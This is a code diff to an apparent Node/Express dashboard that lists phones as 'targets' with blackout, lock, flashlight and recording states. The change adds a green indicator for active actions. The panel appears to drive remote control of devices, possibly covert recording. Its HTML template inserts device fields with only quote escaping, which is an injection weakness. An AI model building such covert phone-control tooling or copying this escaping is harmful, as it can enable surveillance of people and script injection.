@@ -444,12 +444,17 @@ app.get('/', (req, res) => {
                 statusBadge = '<span style="color:var(--danger); font-weight:bold; display:inline-flex; align-items:center; gap:5px;"><span style="display:inline-block; width:7px; height:7px; border-radius:50%; background:var(--danger); box-shadow:0 0 6px var(--danger);"></span>OFFLINE</span>';
             }
 
+            const isAnyActive = d.blackout || d.locked || d.flashlight || d.recording;
+            const activeLight = isAnyActive ?
+                '<span style="display:inline-block; width:8px; height:8px; border-radius:50%; background:var(--neon-green); box-shadow:0 0 8px var(--neon-green); margin-left:6px; vertical-align:middle;" title="Action Active / Running"></span>' :
+                '';
+
             return `
             <tr>
                 <td style="font-family: monospace; color: var(--neon-cyan); white-space: nowrap; vertical-align: middle;">
                     <div style="display: inline-flex; align-items: center; gap: 5px; vertical-align: middle;">
                         <span onclick="renameDevice('${d.deviceId}', '${(d.alias || '').replace(/'/g, "\\'")}')" style="cursor:pointer; font-size:0.6rem; opacity:0.75; transition:opacity 0.2s; line-height:1; user-select:none;" onmouseover="this.style.opacity=1" onmouseout="this.style.opacity=0.75" title="Rename Target">✏️</span>
-                        <span>${displayName}</span><span style="color:#666; font-size:0.68rem;">${subName}</span>
+                        <span>${displayName}</span><span style="color:#666; font-size:0.68rem;">${subName}</span>${activeLight}
                     </div>
                 </td>
                 <td style="vertical-align: middle;">${d.model || 'SM-F731W'}</td>
